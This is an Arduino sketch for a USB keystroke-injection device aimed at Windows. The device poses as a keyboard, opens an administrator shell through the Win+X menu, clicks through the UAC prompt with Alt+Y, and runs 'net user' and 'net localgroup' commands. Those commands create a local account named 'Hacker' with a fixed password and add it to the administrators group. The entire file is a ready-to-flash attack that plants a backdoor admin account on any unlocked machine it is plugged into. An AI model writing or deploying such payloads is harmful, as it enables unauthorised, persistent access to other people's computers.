#include <HID.h>
#include <Keyboard.h>

// Init function
void setup()
{


  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  delay(1000);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(500);

  typeKey('a');
  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  delay(5000);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(5000);

  Keyboard.println("net user /add Hacker Password");
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("net localgroup administrators Hacker /add");
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {}

void typeKey(int key) {
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}
